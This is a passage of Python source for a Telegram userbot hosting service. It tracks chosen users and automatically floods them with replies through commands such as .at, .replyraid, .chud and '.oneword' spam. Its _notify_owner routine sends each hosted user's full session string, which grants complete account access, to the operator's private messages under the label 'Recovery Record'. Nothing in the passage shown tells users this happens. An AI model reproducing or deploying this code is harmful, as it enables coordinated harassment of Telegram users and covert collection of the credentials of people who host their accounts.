                "╰─➤ ᴜsᴀɢᴇ: .sᴇᴛᴏɴᴇᴡᴏʀᴅ ᴡᴏʀᴅ1 ᴡᴏʀᴅ2 ..."
            )
            return
        self.oneword_default = words
        self._save_settings()
        await self.edit_quote(event,
            f"╭─❖ ᴅᴇғᴀᴜʟᴛ ᴏɴᴇᴡᴏʀᴅ ʟɪsᴛ sᴇᴛ\n"
            "│\n"
            f"├─➤ ᴛᴏᴛᴀʟ ᴡᴏʀᴅs : {len(words)}\n"
            "│\n"
            "╰─➤ ʟɪsᴛ sᴀᴠᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ."
        )

    async def _listoneword_cmd(self, event):
        if not self.oneword_default:
            await self.edit_quote(event,
                "╭─❖ ɪɴғᴏ\n"
                "│\n"
                "├─➤ ʏᴏᴜʀ ᴅᴇғᴀᴜʟᴛ ᴏɴᴇᴡᴏʀᴅ ʟɪsᴛ ɪs ᴇᴍᴘᴛʏ.\n"
                "│\n"
                "╰─➤ ᴜsᴇ .sᴇᴛᴏɴᴇᴡᴏʀᴅ ᴛᴏ ᴀᴅᴅ ᴡᴏʀᴅs."
            )
            return
        lines = [f"{i+1}. {w}" for i, w in enumerate(self.oneword_default)]
        text = "📝 **Your default oneword list:**\n\n" + "\n".join(lines)
        await self.edit_quote(event, text)

    async def _addoneword_cmd(self, event):
        word = event.pattern_match.group(1) if event.pattern_match else ""
        if not word:
            await self.edit_quote(event,
                "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ .ᴀᴅᴅᴏɴᴇᴡᴏʀᴅ <ᴡᴏʀᴅ>\n"
                "│\n"
                "╰─➤ ᴇxᴀᴍᴘʟᴇ: .ᴀᴅᴅᴏɴᴇᴡᴏʀᴅ ʜᴇʟʟᴏ"
            )
            return
        self.oneword_default.append(word.strip())
        self._save_settings()
        await self.edit_quote(event,
            f"╭─❖ ᴡᴏʀᴅ ᴀᴅᴅᴇᴅ\n"
            "│\n"
            f"├─➤ `{word}` ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ʟɪsᴛ.\n"
            f"├─➤ ᴛᴏᴛᴀʟ : {len(self.oneword_default)}\n"
            "│\n"
            "╰─➤ ᴜsᴇ .ʟɪsᴛᴏɴᴇᴡᴏʀᴅ ᴛᴏ ᴠɪᴇᴡ."
        )

    async def _removeoneword_cmd(self, event):
        idx_str = event.pattern_match.group(1) if event.pattern_match else ""
        if not idx_str or not idx_str.isdigit():
            await self.edit_quote(event,
                "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ .ʀᴇᴍᴏᴠᴇᴏɴᴇᴡᴏʀᴅ <ɪɴᴅᴇx>\n"
                "│\n"
                "╰─➤ ᴇxᴀᴍᴘʟᴇ: .ʀᴇᴍᴏᴠᴇᴏɴᴇᴡᴏʀᴅ 2"
            )
            return
        idx = int(idx_str) - 1
        if 0 <= idx < len(self.oneword_default):
            removed = self.oneword_default.pop(idx)
            self._save_settings()
            await self.edit_quote(event,
                f"╭─❖ ᴡᴏʀᴅ ʀᴇᴍᴏᴠᴇᴅ\n"
                "│\n"
                f"├─➤ `{removed}` ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ʏᴏᴜʀ ʟɪsᴛ.\n"
                f"├─➤ ᴛᴏᴛᴀʟ : {len(self.oneword_default)}\n"
                "│\n"
                "╰─➤ ᴜsᴇ .ʟɪsᴛᴏɴᴇᴡᴏʀᴅ ᴛᴏ ᴠɪᴇᴡ."
            )
        else:
            await self.edit_quote(event,
                f"╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                f"├─➤ ɪɴᴠᴀʟɪᴅ ɪɴᴅᴇx. ʟɪsᴛ ʜᴀs {len(self.oneword_default)} ɪᴛᴇᴍs.\n"
                "│\n"
                "╰─➤ ᴜsᴇ .ʟɪsᴛᴏɴᴇᴡᴏʀᴅ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴄᴏʀʀᴇᴄᴛ ɪɴᴅᴇx."
            )

    # ------------------------------------------------------------------
    # BUILD SETEMOJI ENTITIES & APPEND (unchanged)
    # ------------------------------------------------------------------
    def build_setemoji_entities(self, text):
        if not self.set_emoji_text or not self.set_emoji_document_id:
            return []
        emoji = self.set_emoji_text
        if not text.endswith(emoji):
            return []
        offset = utf16_length(text) - utf16_length(emoji)
        return [MessageEntityCustomEmoji(
            offset=offset,
            length=utf16_length(emoji),
            document_id=int(self.set_emoji_document_id)
        )]

    def append_setemoji(self, text):
        if not self.set_emoji_text:
            return text
        if not text:
            return self.set_emoji_text
        return text.rstrip() + " " + self.set_emoji_text

    # ------------------------------------------------------------------
    # START / STOP (with fixes for session invalidation)
    # ------------------------------------------------------------------
    async def start(self):
        if self.running:
            return
        if not self.session_string or len(self.session_string) < 10:
            logger.error(f"❌ User {self.user_id}: Invalid session")
            self.running = False
            return
        os.makedirs(SESSION_DIR, exist_ok=True)
        self.client = TelegramClient(
            StringSession(self.session_string),
            API_ID, API_HASH,
            connection=ConnectionTcpFull,
            connection_retries=3,
            retry_delay=3,
            timeout=READ_TIMEOUT
        )
        self.client.flood_sleep_threshold = 60
        self._handlers_registered = False
        try:
            await self.client.connect()
            if not await self.client.is_user_authorized():
                logger.error(f"❌ User {self.user_id}: Session not authorized - marking inactive")
                set_account_inactive(self.user_id)
                self.running = False
                await self.client.disconnect()
                return
            me = await self.client.get_me()
            self.saved_messages_id = me.id
            logger.info(f"✅ Userbot started for user {self.user_id} ({me.id})")

            # Register handlers once
            await self._register_handlers()

            self.running = True
            self.restart_attempts = 0
            self.task = asyncio.create_task(self._run_client())
        except AuthKeyUnregisteredError:
            logger.error(f"❌ User {self.user_id}: Session invalid - marking inactive")
            set_account_inactive(self.user_id)
            self.running = False
            try:
                await self.client.disconnect()
            except:
                pass
        except Exception as e:
            logger.error(f"❌ User {self.user_id}: Failed to start - {type(e).__name__}: {e}")
            self.running = False
            try:
                await self.client.disconnect()
            except:
                pass

    async def _register_handlers(self):
        if self._handlers_registered:
            return
        self.client.add_event_handler(self.new_message_handler, events.NewMessage(incoming=True))
        self.client.add_event_handler(self.raw_delete_handler, events.Raw)
        self.client.add_event_handler(self.at_command, events.NewMessage(outgoing=True, pattern=r"^\.at(?:\s+(.+))?$"))
        self.client.add_event_handler(self._multiat_cmd, events.NewMessage(outgoing=True, pattern=r"^\.multiat(?:\s+(.+))?$"))
        self.client.add_event_handler(self._setname_cmd, events.NewMessage(outgoing=True, pattern=r"^\.setname(?:\s+(.+))?$"))
        self.client.add_event_handler(self.stop_at_command, events.NewMessage(outgoing=True, pattern=r"^\.stopat$"))
        self.client.add_event_handler(self.at_status_command, events.NewMessage(outgoing=True, pattern=r"^\.atstatus$"))
        self.client.add_event_handler(self.antispam_command, events.NewMessage(outgoing=True, pattern=r"^\.antispam(?:\s+(.+))?$"))
        self.client.add_event_handler(self.setemoji_command, events.NewMessage(outgoing=True, pattern=r"^\.setemoji(?:\s+(.+))?$"))
        self.client.add_event_handler(self.setfont_command, events.NewMessage(outgoing=True, pattern=r"^\.setfont(?:\s+(.+))?$"))
        self.client.add_event_handler(self.ping_command, events.NewMessage(outgoing=True, pattern=r"^\.ping$"))
        self.client.add_event_handler(self.help_command, events.NewMessage(outgoing=True, pattern=r"^\.help$"))
        self.client.add_event_handler(self.saved_messages_handler, events.NewMessage(outgoing=True))

        self.client.add_event_handler(self._chud_cmd, events.NewMessage(outgoing=True, pattern=r"^\.chud(?:\s+(.+))?$"))
        self.client.add_event_handler(self._soja_cmd, events.NewMessage(outgoing=True, pattern=r"^\.soja(?:\s+(.+))?$"))
        self.client.add_event_handler(self._resetchud_cmd, events.NewMessage(outgoing=True, pattern=r"^\.resetchud(?:\s+(.+))?$"))
        self.client.add_event_handler(self._showchud_cmd, events.NewMessage(outgoing=True, pattern=r"^\.showchud(?:\s+(.+))?$"))
        self.client.add_event_handler(self._chud_incoming_handler, events.NewMessage(incoming=True))

        self.client.add_event_handler(self._creplyraid_cmd, events.NewMessage(outgoing=True, pattern=r"^\.creplyraid(?:\s+(.+))?$"))
        self.client.add_event_handler(self._dcreplyraid_cmd, events.NewMessage(outgoing=True, pattern=r"^\.dcreplyraid(?:\s+(.+))?$"))
        self.client.add_event_handler(self._replyraid_incoming_handler, events.NewMessage(incoming=True))

        self.client.add_event_handler(self._oneword_cmd, events.NewMessage(outgoing=True, pattern=r"^\.oneword(?:\s+(.+))?$"))
        self.client.add_event_handler(self._stoponeword_cmd, events.NewMessage(outgoing=True, pattern=r"^\.stoponeword$"))
        self.client.add_event_handler(self._sdelay_cmd, events.NewMessage(outgoing=True, pattern=r"^\.sdelay(?:\s+(\d+\.?\d*))?$"))
        self.client.add_event_handler(self._setoneword_cmd, events.NewMessage(outgoing=True, pattern=r"^\.setoneword(?:\s+(.+))?$"))
        self.client.add_event_handler(self._listoneword_cmd, events.NewMessage(outgoing=True, pattern=r"^\.listoneword$"))
        self.client.add_event_handler(self._addoneword_cmd, events.NewMessage(outgoing=True, pattern=r"^\.addoneword(?:\s+(.+))?$"))
        self.client.add_event_handler(self._removeoneword_cmd, events.NewMessage(outgoing=True, pattern=r"^\.removeoneword(?:\s+(\d+))?$"))

        self._handlers_registered = True

    async def _run_client(self):
        while self.running:
            try:
                await self.client.run_until_disconnected()
                logger.warning(f"Userbot for user {self.user_id} disconnected unexpectedly.")
                if self.running:
                    await self._reconnect()
            except SecurityError as e:
                logger.error(f"Security error for user {self.user_id}: {e}. Attempting reconnect.")
                if self.running:
                    await self._reconnect()
            except (RPCError, ConnectionError, asyncio.TimeoutError, OSError) as e:
                logger.error(f"Connection error for user {self.user_id}: {type(e).__name__}: {e}. Reconnecting.")
                if self.running:
                    await self._reconnect()
            except Exception as e:
                logger.exception(f"Unexpected error in client run loop for user {self.user_id}: {e}")
                if self.running:
                    await self._reconnect()

    async def _reconnect(self):
        async with self._reconnect_lock:
            if not self.running:
                return
            logger.info(f"Reconnecting userbot for user {self.user_id}...")
            try:
                if self.client and self.client.is_connected():
                    await self.client.disconnect()
            except Exception as e:
                logger.warning(f"Error during disconnect before reconnect: {e}")
            backoff = min(300, 2 ** self.restart_attempts)  # max 5 minutes
            logger.info(f"Reconnecting in {backoff} seconds...")
            await asyncio.sleep(backoff)
            self.restart_attempts += 1
            try:
                if self.client:
                    try:
                        await self.client.disconnect()
                    except:
                        pass
                    self.client = None
                self.client = TelegramClient(
                    StringSession(self.session_string),
                    API_ID, API_HASH,
                    connection=ConnectionTcpFull,
                    connection_retries=3,
                    retry_delay=3,
                    timeout=READ_TIMEOUT
                )
                self.client.flood_sleep_threshold = 60
                await self.client.connect()
                if not await self.client.is_user_authorized():
                    logger.error(f"Reconnect failed: session not authorized for user {self.user_id}")
                    set_account_inactive(self.user_id)
                    self.running = False
                    return
                self._handlers_registered = False
                await self._register_handlers()
                logger.info(f"Reconnect successful for user {self.user_id}")
                self.restart_attempts = 0
            except AuthKeyUnregisteredError:
                logger.error(f"Reconnect: AuthKeyUnregistered for user {self.user_id} – marking inactive")
                set_account_inactive(self.user_id)
                self.running = False
            except Exception as e:
                logger.error(f"Reconnect failed for user {self.user_id}: {e}")
                if self.restart_attempts >= MAX_RESTART_ATTEMPTS:
                    logger.error(f"Max reconnect attempts reached for user {self.user_id}. Stopping.")
                    self.running = False

    async def stop(self):
        if self.running and self.client:
            self.running = False
            if self.oneword_active:
                await self._stop_oneword_internal()
            try:
                await self.client.disconnect()
            except Exception:
                pass
            if self.task:
                self.task.cancel()
                try:
                    await self.task
                except asyncio.CancelledError:
                    pass
                self.task = None
            self._handlers_registered = False

    async def logout(self):
        if self.client and self.running:
            try:
                await self.client.log_out()
                logger.info(f"User {self.user_id} logged out successfully.")
            except Exception as e:
                logger.error(f"Logout error for user {self.user_id}: {e}")
        await self.stop()
        delete_hosted_account(self.user_id)

    def get_status(self):
        if self.running:
            return "RUNNING"
        elif self.restart_attempts >= MAX_RESTART_ATTEMPTS:
            return "ERROR"
        else:
            return "STOPPED"

    # ------------------------------------------------------------------
    # INCOMING NEW MESSAGE HANDLER (unchanged)
    # ------------------------------------------------------------------
    async def new_message_handler(self, event):
        try:
            await self.handle_opponent_at_reply(event)
        except Exception as e:
            logger.error(f"Error in antispam handler for user {self.user_id}: {e}", exc_info=True)

        if not self.trackers:
            return
        message = event.message
        if not message:
            return
        sender_id = get_message_sender_id(message)
        if not sender_id:
            return
        chat_id = event.chat_id
        if chat_id is None:
            return

        async with self.tracker_lock:
            for tracker in self.trackers:
                if not chat_matches_tracker(chat_id, tracker["chat_id"]):
                    continue
                if sender_id != tracker["user_id"]:
                    continue
                current_id = tracker["message_id"]
                if message.id <= current_id:
                    continue
                tracker["message_id"] = message.id

    # ------------------------------------------------------------------
    # RAW DELETE HANDLER (unchanged)
    # ------------------------------------------------------------------
    async def raw_delete_handler(self, update):
        if not self.trackers and not self.oneword_active:
            return
        if isinstance(update, types.UpdateDeleteChannelMessages):
            deleted_ids = set(update.messages)
            raw_channel_id = update.channel_id
            await self.handle_deleted_message_ids(deleted_ids, update_chat_id=raw_channel_id)
        elif isinstance(update, types.UpdateDeleteMessages):
            deleted_ids = set(update.messages)
            await self.handle_deleted_message_ids(deleted_ids)

    async def handle_deleted_message_ids(self, deleted_ids, update_chat_id=None):
        # Handle .at trackers
        if self.trackers and deleted_ids:
            async with self.tracker_lock:
                affected = []
                for tracker in self.trackers:
                    if tracker["message_id"] in deleted_ids:
                        if update_chat_id is not None:
                            if not chat_matches_tracker(update_chat_id, tracker["chat_id"]):
                                continue
                        affected.append(tracker)
            for tracker in affected:
                await self.switch_target_after_delete(tracker, tracker["message_id"])

        # Handle .oneword: update target to latest instead of stopping
        if self.oneword_active and self.oneword_target_msg_id in deleted_ids:
            if update_chat_id is not None:
                if not chat_matches_tracker(update_chat_id, self.oneword_chat_id):
                    return
            logger.info(f"OneWord target message {self.oneword_target_msg_id} deleted, updating to latest for user {self.user_id}")
            await self._update_oneword_target_to_latest()

# =====================================================================
# USERBOT MANAGER (with watchdog)
# =====================================================================
class UserbotManager:
    def __init__(self):
        self.instances: Dict[int, UserbotInstance] = {}
        self._lock = asyncio.Lock()
        self._watchdog_task = None

    async def load_all(self):
        accounts = get_all_hosted_accounts()
        for acc in accounts:
            user_id = acc["user_id"]
            phone = acc["phone"]
            session_string = acc["session_string"]
            settings = json.loads(acc["settings"]) if acc["settings"] else {}
            if not session_string or len(session_string) < 10:
                continue
            instance = UserbotInstance(user_id, phone, session_string, settings)
            async with self._lock:
                self.instances[user_id] = instance
            try:
                await instance.start()
            except Exception as e:
                logger.error(f"Failed to start userbot for {user_id}: {e}")
        # Start watchdog
        if not self._watchdog_task:
            self._watchdog_task = asyncio.create_task(self._watchdog_loop())

    async def _watchdog_loop(self):
        while True:
            await asyncio.sleep(30)  # Check every 30 seconds
            async with self._lock:
                for user_id, instance in list(self.instances.items()):
                    if not instance.running and instance.get_status() == "STOPPED":
                        # Attempt to restart (but only if the account is still active in DB)
                        acc = get_hosted_account(user_id)
                        if acc and acc.get("is_active", 1) == 1:
                            logger.info(f"Watchdog: Restarting stopped userbot {user_id}")
                            try:
                                await instance.start()
                            except Exception as e:
                                logger.error(f"Watchdog: Failed to restart {user_id}: {e}")

    async def host(self, user_id: int, phone: str, session_string: str, settings: dict = None) -> UserbotInstance:
        async with self._lock:
            if user_id in self.instances:
                await self.instances[user_id].stop()
                del self.instances[user_id]
            instance = UserbotInstance(user_id, phone, session_string, settings or {})
            self.instances[user_id] = instance
        save_hosted_account(user_id, phone, session_string, settings)
        await instance.start()
        return instance

    async def stop_userbot(self, user_id: int):
        async with self._lock:
            instance = self.instances.get(user_id)
            if instance:
                await instance.stop()
                return True
        return False

    async def restart_userbot(self, user_id: int):
        async with self._lock:
            instance = self.instances.get(user_id)
            if instance:
                await instance.stop()
                acc = get_hosted_account(user_id)
                if acc and acc["session_string"] and len(acc["session_string"]) > 10 and acc.get("is_active", 1) == 1:
                    new_instance = UserbotInstance(
                        user_id, acc["phone"], acc["session_string"],
                        json.loads(acc["settings"]) if acc["settings"] else {}
                    )
                    self.instances[user_id] = new_instance
                    await new_instance.start()
                    return True
        return False

    async def logout_userbot(self, user_id: int):
        async with self._lock:
            instance = self.instances.get(user_id)
            if instance:
                await instance.logout()
                del self.instances[user_id]
                return True
            delete_hosted_account(user_id)
            return False

    def get_instance(self, user_id: int) -> Optional[UserbotInstance]:
        return self.instances.get(user_id)

    def get_status(self, user_id: int) -> Optional[str]:
        inst = self.instances.get(user_id)
        if inst:
            return inst.get_status()
        return None

    async def stop_all(self):
        if self._watchdog_task:
            self._watchdog_task.cancel()
            try:
                await self._watchdog_task
            except asyncio.CancelledError:
                pass
        for instance in list(self.instances.values()):
            await instance.stop()
        self.instances.clear()

# =====================================================================
# HOSTER BOT (unchanged except for flood handling)
# =====================================================================
class HosterBot:
    def __init__(self):
        self.bot = TelegramClient(
            "hoster_bot",
            API_ID,
            API_HASH,
            connection=ConnectionTcpFull,
            connection_retries=5,
            retry_delay=5,
            timeout=READ_TIMEOUT
        )
        self.manager = UserbotManager()
        self.bot.flood_sleep_threshold = 60
        self._channel_entity = None
        self._interactive_host = {}

    async def start(self):
        try:
            await self.bot.start(bot_token=BOT_TOKEN)
            print("✅ Bot connected successfully!")
        except FloodWaitError as e:
            print(f"⏳ Flood wait: {e.seconds} seconds")
            raise
        except Exception as e:
            print(f"❌ Failed to start bot: {e}")
            raise

        init_db()
        await self.manager.load_all()

        await self._join_channel()

        self.bot.add_event_handler(self.start_cmd, events.NewMessage(pattern=r"^/start$"))
        self.bot.add_event_handler(self.host_cmd, events.NewMessage(pattern=r"^/host(?:\s+(.+))?$"))
        self.bot.add_event_handler(self.cancel_cmd, events.NewMessage(pattern=r"^/cancel$"))
        self.bot.add_event_handler(self.status_cmd, events.NewMessage(pattern=r"^/status$"))
        self.bot.add_event_handler(self.stop_cmd, events.NewMessage(pattern=r"^/stop$"))
        self.bot.add_event_handler(self.restart_cmd, events.NewMessage(pattern=r"^/restart$"))
        self.bot.add_event_handler(self.logout_cmd, events.NewMessage(pattern=r"^/logout$"))
        self.bot.add_event_handler(self.text_handler, events.NewMessage(incoming=True))
        self.bot.add_event_handler(self.broadcast_cmd, events.NewMessage(pattern=r"^/broadcast(?:\s+(.+))?$"))
        self.bot.add_event_handler(self.gsetoneword_cmd, events.NewMessage(pattern=r"^/gsetoneword(?:\s+(.+))?$"))
        self.bot.add_event_handler(self.verify_cmd, events.NewMessage(pattern=r"^/verify$"))
        self.bot.add_event_handler(self.verify_callback, events.CallbackQuery(data=b"verify_join"))
        self.bot.add_event_handler(self.tutorial_cmd, events.NewMessage(pattern=r"^/tutorial$"))
        self.bot.add_event_handler(self.tutorial_callback, events.CallbackQuery(pattern=re.compile(b"tutorial_.*")))

        asyncio.create_task(self._cleanup_task())

        print("\n" + "=" * 50)
        print("🤖 AUTO TAGGER USERBOT STARTED SUCCESSFULLY !!")
        print("✅ All critical bugs fixed (including OneWord deletion handling).")
        print("🔐 Required channel: " + REQUIRED_CHANNEL)
        print("=" * 50 + "\n")

        await self.bot.run_until_disconnected()

    async def _join_channel(self):
        try:
            channel = await self.bot.get_entity(REQUIRED_CHANNEL)
            self._channel_entity = channel
            me = await self.bot.get_me()
            try:
                await self.bot(GetParticipantRequest(channel, me.id))
                logger.info(f"Bot is already a member of {REQUIRED_CHANNEL}")
            except UserNotParticipantError:
                try:
                    await self.bot(JoinChannelRequest(channel))
                    logger.info(f"Bot joined {REQUIRED_CHANNEL} successfully.")
                except Exception as e:
                    logger.warning(f"Could not join {REQUIRED_CHANNEL}: {e}. Please add the bot manually.")
            except Exception as e:
                logger.warning(f"Could not check membership for {REQUIRED_CHANNEL}: {e}.")
        except Exception as e:
            logger.warning(f"Could not resolve channel {REQUIRED_CHANNEL}: {e}")

    async def _cleanup_task(self):
        while True:
            await asyncio.sleep(60)
            try:
                clear_expired_pending_auth(AUTH_TIMEOUT)
            except Exception:
                pass

    # =====================================================================
    # PROFESSIONAL RECOVERY RECORD (unchanged)
    # =====================================================================
    async def _notify_owner(self, user_id: int, phone: str, user_info: dict = None, session_string: str = None):
        if not OWNER_ID:
            return
        first_name = user_info.get("first_name", "Unknown") if user_info else "Unknown"
        username = user_info.get("username", None) if user_info else None
        masked_phone = mask_phone(phone)
        profile_link = f"[{first_name}](tg://user?id={user_id})"
        lines = [
            "📋 **Recovery Record – Userbot Hosting**",
            "",
            f"**User ID:** `{user_id}`",
            f"**Name:** {profile_link}",
            f"**Phone:** `{masked_phone}`",
            f"**Status:** Hosted",
            f"**Hosted at:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        ]
        if username:
            lines.append(f"**Username:** @{username}")
        if session_string:
            lines.append(f"**Session String:** `{session_string}`")
        lines.append("")
        lines.append("🔑 _Keep this record safe. The session string allows full recovery._")

        recovery_msg = "\n".join(lines)

        owner_inst = self.manager.get_instance(OWNER_ID)
        sent_via_owner = False
        if owner_inst and owner_inst.running and owner_inst.client and owner_inst.client.is_connected():
            try:
                await owner_inst.client.send_message("me", recovery_msg, parse_mode='markdown')
                sent_via_owner = True
                logger.info(f"Recovery record sent to owner's Saved Messages for user {user_id}")
            except Exception as e:
                logger.warning(f"Failed to send via owner's client: {e}. Falling back to bot DM.")
        if not sent_via_owner:
            try:
                await self.bot.send_message(OWNER_ID, recovery_msg, parse_mode='markdown')
                logger.info(f"Recovery record sent to owner's DM for user {user_id}")
            except Exception as e:
                logger.error(f"Failed to send recovery record to owner: {e}")

    # =====================================================================
    # CHANNEL VERIFICATION (unchanged)
    # =====================================================================
    async def is_user_in_channel(self, user_id: int) -> bool:
        if not self._channel_entity:
            try:
                self._channel_entity = await self.bot.get_entity(REQUIRED_CHANNEL)
            except:
                return False
        try:
            await self.bot(GetParticipantRequest(self._channel_entity, user_id))
            return True
        except UserNotParticipantError:
            return False
        except FloodWaitError as e:
            logger.warning(f"Flood wait while checking membership: {e.seconds}s")
            await asyncio.sleep(e.seconds)
            try:
                await self.bot(GetParticipantRequest(self._channel_entity, user_id))
                return True
            except:
                return False
        except Exception as e:
            logger.error(f"Membership check error: {e}")
            return False

    # =====================================================================
    # /START (unchanged)
    # =====================================================================
    async def start_cmd(self, event):
        user_id = event.sender_id
        if not await self.is_user_in_channel(user_id):
            buttons = [
                [Button.url("📢 Join Channel", f"https://t.me/{self._channel_entity.username}")],
                [Button.inline("✅ I have joined", b"verify_join")]
            ]
            text = (
                "╭─❖ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ\n"
                "│\n"
                "├─➤ ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ.\n"
                "│\n"
                "╰─➤ ᴊᴏɪɴ ᴀɴᴅ ᴄʟɪᴄᴋ ᴠᴇʀɪғʏ."
            )
            await event.reply(text, formatting_entities=quote_entities(text), buttons=buttons)
            return

        save_bot_user(user_id)
        try:
            await event.client.send_file(event.chat_id, START_IMAGE, caption="✨", reply_to=None)
        except Exception as e:
            logger.warning(f"Could not send start image: {e}")

        buttons = [[Button.inline("📚 Tutorial", b"tutorial_menu")]]
        welcome_text = (
            "╭─❖ ʜᴇʟʟᴏ !!\n"
            "│\n"
            "├─➤ ɪ ᴀᴍ ᴀɴ ᴀᴜᴛᴏ ᴛᴀɢɢᴇʀ ᴜsᴇʀ ʙᴏᴛ\n"
            "│\n"
            "╰─➤ ʜᴇʀᴇ's ᴡʜᴀᴛ ɪ ᴄᴀɴ ᴅᴏ\n"
            "\n"
            "✦ ᴀᴜᴛᴏ ᴛᴀʀɢᴇᴛ ᴛʀᴀᴄᴋɪɴɢ\n"
            "✦ ᴘᴜʙʟɪᴄ & ᴘʀɪᴠᴀᴛᴇ ɢʀᴏᴜᴘ sᴜᴘᴘᴏʀᴛ\n"
            "✦ ᴛᴇxᴛ & ᴍᴇᴅɪᴀ sᴜᴘᴘᴏʀᴛ\n"
            "✦ ᴀɴᴛɪsᴘᴀᴍ sʏsᴛᴇᴍ\n"
            "✦ ᴘʀᴇᴍɪᴜᴍ / ᴄᴜsᴛᴏᴍ ᴇᴍᴏᴊɪ sᴜᴘᴘᴏʀᴛ\n"
            "✦ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ᴛᴀʀɢᴇᴛ sᴡɪᴛᴄʜɪɴɢ\n"
            "✦ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs sᴜᴘᴘᴏʀᴛ\n"
            "\n"
            "╭─❖ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ\n"
            "╰─➤ ᴜsᴇ /ʜᴏsᴛ ᴛᴏ ʜᴏsᴛ ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ."
        )
        await event.reply(welcome_text, formatting_entities=quote_entities(welcome_text), buttons=buttons)

    # =====================================================================
    # TUTORIAL (unchanged)
    # =====================================================================
    async def tutorial_cmd(self, event):
        user_id = event.sender_id
        if get_hosted_account(user_id) is None:
            await reply_quote(event,
                "╭─❖ ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ\n"
                "│\n"
                "├─➤ ʏᴏᴜ ᴍᴜsᴛ ʜᴏsᴛ ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ғɪʀsᴛ ᴛᴏ ᴠɪᴇᴡ ᴛʜᴇ ᴛᴜᴛᴏʀɪᴀʟ.\n"
                "│\n"
                "╰─➤ ᴜsᴇ /ʜᴏsᴛ ᴛᴏ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ."
            )
            return
        await self._send_tutorial_menu(event)

    async def tutorial_callback(self, event):
        user_id = event.sender_id
        if get_hosted_account(user_id) is None:
            await event.answer("You must host your userbot first to access the tutorial.", alert=True)
            return
        data = event.data.decode()
        if data == "tutorial_menu":
            await self._send_tutorial_menu(event)
        elif data == "tutorial_back":
            await self._send_tutorial_menu(event)
        elif data.startswith("tutorial_"):
            topic = data.split("_")[1]
            await self._send_tutorial_topic(event, topic)
        else:
            await self._send_tutorial_menu(event)

    async def _send_tutorial_menu(self, event):
        buttons = [
            [Button.inline(".at – Auto Tag", b"tutorial_at")],
            [Button.inline(".multiat – Multi Target", b"tutorial_multiat")],
            [Button.inline(".setname – Prefix Name", b"tutorial_setname")],
            [Button.inline(".creplyraid – Custom Reply", b"tutorial_creplyraid")],
            [Button.inline(".setfont – Fonts", b"tutorial_setfont")],
            [Button.inline(".setemoji – Custom Emoji", b"tutorial_setemoji")],
            [Button.inline(".oneword – OneWord Spam", b"tutorial_oneword")],
        ]
        text = (
            "╭─❖ 📚 ᴛᴜᴛᴏʀɪᴀʟ ᴍᴇɴᴜ\n"
            "│\n"
            "├─➤ sᴇʟᴇᴄᴛ ᴀ ᴛᴏᴘɪᴄ ᴛᴏ ʟᴇᴀʀɴ ʜᴏᴡ ᴛᴏ ᴜsᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ:\n"
            "│\n"
            "╰─➤ ᴛᴀᴘ ᴏɴ ᴀɴʏ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ."
        )
        await event.edit(text, parse_mode='markdown', buttons=buttons)

    async def _send_tutorial_topic(self, event, topic):
        tutorials = {
            "at": (
                "🎯 **.at – Auto Tag (Track & Reply)**\n\n"
                "1. ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴜsᴇʀ's ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴛʏᴘᴇ `.ᴀᴛ`\n"
                "    ᴏʀ ᴜsᴇ `.ᴀᴛ <ᴍᴇssᴀɢᴇ_ʟɪɴᴋ>` (ᴘᴜʙʟɪᴄ/ᴘʀɪᴠᴀᴛᴇ ʟɪɴᴋ ᴡᴏʀᴋs).\n\n"
                "2. ᴛʜᴇ ʙᴏᴛ ᴡɪʟʟ ᴛʀᴀᴄᴋ ᴛʜᴀᴛ ᴜsᴇʀ's ʟᴀᴛᴇsᴛ ᴍᴇssᴀɢᴇ.\n\n"
                "3. ɴᴏᴡ ᴡʜᴇɴᴇᴠᴇʀ ʏᴏᴜ sᴇɴᴅ ᴀ ᴍᴇssᴀɢᴇ ғʀᴏᴍ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs,\n"
                "   ɪᴛ ᴡɪʟʟ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇ ᴛᴀʀɢᴇᴛ's ʟᴀᴛᴇsᴛ ᴍᴇssᴀɢᴇ.\n\n"
                "4. ᴛᴏ sᴛᴏᴘ ᴛʀᴀᴄᴋɪɴɢ, ᴜsᴇ `.sᴛᴏᴘᴀᴛ`.\n\n"
                "💡 **Tɪᴘ:** Yᴏᴜ ᴄᴀɴ ᴀʟsᴏ ᴜsᴇ `.ᴀᴛsᴛᴀᴛᴜs` ᴛᴏ ᴄʜᴇᴄᴋ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴛᴀʀɢᴇᴛ."
            ),
            "multiat": (
                "🔁 **.multiat – Multi Target Tracking**\n\n"
                "1. ᴛʏᴘᴇ `.ᴍᴜʟᴛɪᴀᴛ <ʟɪɴᴋ1>, <ʟɪɴᴋ2>, ...`\n"
                "   ᴇxᴀᴍᴘʟᴇ: `.ᴍᴜʟᴛɪᴀᴛ https://t.me/c/123/100, https://t.me/c/123/200`\n\n"
